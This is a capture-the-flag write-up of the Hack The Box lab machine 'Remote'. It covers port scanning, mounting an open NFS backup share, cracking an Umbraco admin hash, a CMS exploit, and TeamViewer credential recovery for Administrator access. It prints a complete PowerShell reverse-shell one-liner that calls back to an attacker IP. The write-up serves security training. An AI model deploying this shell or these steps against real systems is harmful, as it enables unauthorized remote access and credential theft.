---
layout: single
title: Remote - Hack The Box
excerpt: "Remote is a beginner's box running a vulnerable version of the Umbraco CMS which can be exploited after we find the credentials from an exposed share. After landing a reverse shell, we find that the machine has TeamViewer installed and we can recover the password with Metasploit then log in as Administrator."
date: 2020-09-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-remote/remote_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - nfs
  - umbraco
  - teamviewer
  - metasploit
---

![](/assets/images/htb-writeup-remote/remote_logo.png)

Remote is a beginner's box running a vulnerable version of the Umbraco CMS which can be exploited after we find the credentials from an exposed share. After landing a reverse shell, we find that the machine has TeamViewer installed and we can recover the password with Metasploit then log in as Administrator.

## Summary

- Find open NFS share and locate Umbraco credentials inside the SDF file
- Use Umbraco exploit with the admin credentials to get a shell
- Find TeamViewer's credentials using Metasploit
- Log in as administrator with the password from TeamViewer

## Portscan

```
root@kali:~/htb/remote# nmap -sC -sV -p- 10.10.10.180
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-21 19:41 EDT
Nmap scan report for remote.htb (10.10.10.180)
Host is up (0.063s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
[...]
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
[...]
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Using crackmapexec, we can identity the OS and the domain name.

```
root@kali:~/htb/remote# cme smb 10.10.10.180
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:REMOTE) (signing:False) (SMBv1:False)
```

## Unsuccessful recon

- FTP site allows anonymous connections but doesn't contain anything
- Null sessions are not allowed on the box (can't enumerate users or shares)

## Website

The site is just some company's website and doesn't have anything interesting.

![](/assets/images/htb-writeup-remote/webpage.png)

We can see from the various left around the page and html source code that it's running the Umbraco CMS.

![](/assets/images/htb-writeup-remote/umbraco.png)

We can access the login page at `http://remote.htb/umbraco/` but we don't have any credentials yet.

![](/assets/images/htb-writeup-remote/adminpage.png)

## NFS mount

Using `showmount` we can check which NFS shares are accessible. Here we can see that `site_backups` is accessible by anyone.

```
root@kali:~# showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

We can mount the NFS share to our `/mnt` directory and examine the files contained within.

```
root@kali:~# mount -t nfs 10.10.10.180:site_backups /mnt
root@kali:~# ls -l /mnt
total 115
drwx------ 2 nobody 4294967294    64 Feb 20 12:16 App_Browsers
drwx------ 2 nobody 4294967294  4096 Feb 20 12:17 App_Data
drwx------ 2 nobody 4294967294  4096 Feb 20 12:16 App_Plugins
drwx------ 2 nobody 4294967294    64 Feb 20 12:16 aspnet_client
drwx------ 2 nobody 4294967294 49152 Feb 20 12:16 bin
drwx------ 2 nobody 4294967294  8192 Feb 20 12:16 Config
drwx------ 2 nobody 4294967294    64 Feb 20 12:16 css
-rwx------ 1 nobody 4294967294   152 Nov  1  2018 default.aspx
-rwx------ 1 nobody 4294967294    89 Nov  1  2018 Global.asax
drwx------ 2 nobody 4294967294  4096 Feb 20 12:16 Media
drwx------ 2 nobody 4294967294    64 Feb 20 12:16 scripts
drwx------ 2 nobody 4294967294  8192 Feb 20 12:16 Umbraco
drwx------ 2 nobody 4294967294  4096 Feb 20 12:16 Umbraco_Client
drwx------ 2 nobody 4294967294  4096 Feb 20 12:16 Views
-rwx------ 1 nobody 4294967294 28539 Feb 20 00:57 Web.config
```

## Locating the umbraco admin password

I expected the password to be inside `Web.config` or some other plaintext configuration file but I did not find any credentials there. However when I looked at the `Umbraco.sdf` file in the `/mnt/App_Data` folder I saw that it contains some hashed passwords.

![](/assets/images/htb-writeup-remote/sdf.png)

The administrator's SHA-1 hash looks interesting: `b8be16afba8c314ad33d812f22a04991b90e2aaa`

It's easily cracked with john: `baconandcheese`

![](/assets/images/htb-writeup-remote/bacon.png)

Now we can log in to the Umbraco page:

![](/assets/images/htb-writeup-remote/umbracoadmin.png)

## Getting a shell with umbraco exploit

A quick search on Exploit-DB shows there's an authenticated exploit for Umbraco version 7.12.4, which is the exact version running on the box.

![](/assets/images/htb-writeup-remote/searchsploit.png)

![](/assets/images/htb-writeup-remote/version.png)

Here's the modified exploit with the proper credentials and the payload using powershell.exe to reach out to our python webserver and download a powershell payload.

![](/assets/images/htb-writeup-remote/payload1.png)

The payload is a standard Nishang reverse TCP shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

After using the expoit, we can get a shell.

![](/assets/images/htb-writeup-remote/user.png)

## Privesc

I noticed that the TeamViewer service is running on the server.

![](/assets/images/htb-writeup-remote/teamviewer_directory.png)

![](/assets/images/htb-writeup-remote/teamviewer_service.png)

We can find the TeamViewer credentials by using the Metasploit module.

![](/assets/images/htb-writeup-remote/teamviewer.png)

Then we can log in to the box as administrator using WinRM.

![](/assets/images/htb-writeup-remote/root.png)